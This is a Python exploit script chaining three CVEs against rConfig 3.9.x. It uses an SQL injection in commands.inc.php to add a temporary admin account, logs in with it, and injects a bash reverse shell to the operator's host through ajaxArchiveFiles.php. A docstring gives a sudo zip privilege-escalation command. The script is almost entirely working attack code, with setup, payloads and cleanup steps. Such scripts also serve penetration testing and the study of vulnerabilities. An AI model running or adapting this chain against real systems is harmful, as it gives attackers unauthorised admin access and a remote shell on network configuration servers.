#!/usr/bin/env python3

# CVE-2019-19509 + CVE-2019-19585 + CVE-2020-10220
'''
Privilege escalation can be obtained using the following command...
By default the apache user, which a shell will be obtained as, has sudo privs to run /usr/bin/zip... 

# From GTFOBINS
TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
'''

try:
    import requests
    import sys
    import argparse
    import string
    import random
    import re
    import hashlib
    import urllib
    from time import sleep
    from bs4 import BeautifulSoup as soup
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    from requests.exceptions import Timeout
    from termcolor import colored
except ImportError as i:
    print("[0x1] Some libraries are missing !")
    print(f"[0x1] Python error: {i}")

requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # Disable insecure SSL warnings

def ascii():
    art = '''
 .-._                                                   _,-,
  `._`-._                                           _,-'_,'
     `._ `-._                                   _,-' _,'
        `._  `-._        __.-----.__        _,-'  _,'
           `._   `#==="""           """===#'   _,'
              `._/)  ._               _.  (\_,'
               )*'     **.__     __.**     '*( 
               #  .==..__  ""   ""  __..==,  # 
               #   `"._(_).       .(_)_."'   #
          ___            ___  _        ____   ___       
     _ _ |  _> ___ ._ _ | | '<_> ___  <__ /  | . |  __  
    | '_>| <__/ . \| ' || |- | |/ . |  <_ \ _`_  /_ \ \/
    |_|  `___/\___/|_|_||_|  |_|\_. | <___/<_>/_/<_>/\_\\
                                <___'              @Kr0ff     
    '''
    print(art)

def temp_user_gen(LU=8):
    
    user = string.ascii_letters
    return ''.join(random.sample(user, LU))

temp_user_gened = temp_user_gen(8) # Store generated username for re-use

def temp_user_pass_gen(LP=8):
    
    dict = string.ascii_letters
    randomize_passwd = random.sample(dict, LP)
    randomize_passwd = ''.join(random.sample(randomize_passwd, LP))
    return ''.join(random.sample(randomize_passwd, LP))

unencrypted_temp_user_pass = temp_user_pass_gen(8) # So it can be displayed for login purpose if needed :)

def encrypt_passwd():
    
    hash_object = hashlib.md5(unencrypted_temp_user_pass.encode())
    md5_hash = hash_object.hexdigest()
    return md5_hash

encrypted_temp_user_pass = encrypt_passwd()

def grab_ver(TARGET): # Grab the version of the target rConfig site
        
    TARGET = f"{TARGET}/login.php"
    r = requests.get(TARGET, verify=False)
    
    try:
        beautify_html = soup(r.text, features='html.parser') # Beautify the html from r.text
        find_all_p = beautify_html.find_all('p')[2] # Grab 2nd object, should be where version is found
        grab_ver = re.search(r'rConfig Version [0-9]\.[0-9]\.[0-9]', str(find_all_p)) # Regex to get only the version

        if not str(grab_ver.group(0)) in r.text: # Simple check if version is found
            print("[" + colored("0x2", "red", attrs=['bold']) + "] Version could not be identified or exploit isn't pointed to the right path...")
            sys.exit(1)

        else:
            print("[" + colored("0x0", "green", attrs=['bold']) + "] Application version is:", colored(f"{grab_ver.group(0)}", "yellow"))

    except Exception as e:
        print("[" + colored("0x4", "grey", "on_yellow", attrs=['dark', 'bold']) + "] Exception was raised !")
        print("[" + colored("0x4", "grey", "on_yellow", attrs=['dark', 'bold']) + f"] Exception is: {e}")
        sys.exit(0)

def send_sqli_payload(TARGET): # Add temp admin to the target rConfig application  
    
    print("[" + colored("0x0","green", attrs=['bold']) + "] Sending SQLi payload to add temporary admin user...")
    print("[" + colored("0x0","green", attrs=['bold']) + f"] Adding user...")
    print("=" * 20)
    print("Username: " + colored(f"{temp_user_gened}", "yellow"))
    print("Password: " + colored(f"{unencrypted_temp_user_pass}", "yellow"))
    print("=" * 20)
    
    # User specific vars
    temp_user_id = str(random.randint(100,200)) # Generate a random user ID
    #temp_user_adm_pass_md5 = '21232f297a57a5a743894a0e4a801fc3' # hash of 'admin'
    temp_userid_md5 = '6c97424dc92f14ae78f8cc13cd08308d'
    user_admin_level = 9 # Administrator

    TARGET = f"{TARGET}/" # In case the input of -t arg is messed up by mistake

    # SQLi Specific var
    sqli_useradd = f"%20;%20INSERT%20INTO%20`users`%20(`id`,%20`username`,%20`password`,%20`userid`,%20`userlevel`,%20`email`,%20`timestamp`,%20`status`)%20VALUES%20({temp_user_id},%20'{temp_user_gened}',%20'{encrypted_temp_user_pass}',%20'{temp_userid_md5}',%20{user_admin_level},%20'{temp_user_gened}@domain.com',%201346920339,%201);--"
   
    r = requests.session()

    send_sqli = r.get(f"{TARGET}/commands.inc.php?searchOption=contains&searchField=vuln&search=search&searchColumn=command{sqli_useradd}", verify=False)
    if not send_sqli:
        print("[" + colored("0x2", "red", attrs=['bold']) + "] Couldn't add a new temporary admin !")
        sys.exit(1)
    else:
        print("[" + colored("0x0","green", attrs=['bold']) + f"] Succssfully added user: " + colored(f"{temp_user_gened}", "yellow") + " !")

def rce_exploit(TARGET, LHOST, LPORT):

    TARGET = f"{TARGET}/" # In case the input of -t arg is messed up by mistake

    print("[" + colored("0x0","green", attrs=['bold']) + f"] Authenticating as user " + colored(f"{temp_user_gened}", "yellow"))
    
    r = requests.session()

    rce_payload = f'`bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"`'
    url_encoded_rce = urllib.parse.quote(rce_payload) # Has to be encoded, otherwise the application doesn't like it

    user_login_info = {
        "user": f"{temp_user_gened}",
        "pass": f"{unencrypted_temp_user_pass}",
        "sublogin": 1
    }

    try: 
        r.post(f"{TARGET}/lib/crud/userprocess.php", data=user_login_info, verify=False, allow_redirects=False) # Authentication request    
        get_dashboard = r.get(f"{TARGET}/dashboard.php", allow_redirects=False, verify=False) # Check if authentication was okay, looking for 200 OK
    
        if not get_dashboard.status_code == 200:
            print("[" + colored("0x2", "red", attrs=['bold']) + "] Authentication was not successful !")

        else:
            try:
                print("[" + colored("0x0","green", attrs=['bold']) + "] Authenticated successfully as " + colored(f"{temp_user_gened}", "yellow") + " !")
                print("[" + colored("0x0","green", attrs=['bold']) + "] Triggering the RCE payload...")
                r.get(f"{TARGET}lib/ajaxHandlers/ajaxArchiveFiles.php?path={url_encoded_rce}&ext=random",verify=False ,timeout=10) # Trigger RCE 

            except Timeout:
                print("[" + colored("0x0","green", attrs=['bold']) + "] Timeout hit, RCE likely triggered. Check Listener !")
                
            else:
                print("[" + colored("0x2","red", attrs=['bold']) + "] Couldn't trigger the RCE payload !")

        sleep(0.5)   
        sqli_userdel = f"%20;DELETE%20FROM%20`users`%20WHERE%20`username`='{temp_user_gened}';--"

        print("[" + colored("0x0","green", attrs=['bold']) + "] Deleting the temporary admin: " + colored(f"{temp_user_gened}", "yellow"))
        r.get(f"{TARGET}/commands.inc.php?searchOption=contains&searchField=vuln&search=search&searchColumn=command{sqli_userdel}", verify=False)
        
        # www/lib/ajaxHandlers <- folder where rce payload is uploaded
        print("[" + colored("0x5", "yellow", attrs=['bold']) + "] The RCE payload is uploaded to " + colored("@RCONFIG_INSTALL_DIR/www/lib/ajaxHandlers", "cyan") + " !")
        print("[" + colored("0x5", "yellow", attrs=['bold']) + "] Make sure to clean it after you're done !")
        
        print("[" + colored("0x0","green", attrs=['bold']) + "] All done !")
        sys.exit(0)

    except Exception as e:
        print("[" + colored("0x4", "grey", "on_yellow", attrs=['dark', 'bold']) + "] Exception was raised !")
        print("[" + colored("0x4", "grey", "on_yellow", attrs=['dark', 'bold']) + f"] Exception is: {e}")
        sys.exit(0)

#Initilize parser for arguments
def parse_argz():
    parser = argparse.ArgumentParser(description='rConfig 3.9.x Chained Remote Code Execution')
    parser.add_argument("-t", "--target", help="Target https:[IP/HOSTNAME][:PORT]/rconfig/", type=str, required=True)
    parser.add_argument("-lh", "--lhost", help="Local IP for reverse shell", type=str, required=True)
    parser.add_argument("-lp", "--lport", help="Local port for reverse shell", type=int, required=True)
    #args = parser.parse_args(args=None if sys.argv[1:] else ['--help']) #Show help menu if no arguments provided
    args = parser.parse_args()

    if not args.target or not args.lhost or not args.lport:
        args.error("[" + colored("0x3","yellow", attrs=['bold']) + "] Not all arguments provided")
        sys.exit(1)
    
    else:
        TARGET = str(args.target)
        LHOST = str(args.lhost)
        LPORT = int(args.lport)

        grab_ver(TARGET)
        send_sqli_payload(TARGET)
        rce_exploit(TARGET, LHOST, LPORT)

if __name__ == "__main__":

    try:
        ascii()
        parse_argz()
    
    except Exception as e:
        print("[" + colored("0x1", "grey", "on_red", attrs=['dark', 'bold'])+ f"] Python error: {e}")
        sys.exit(1)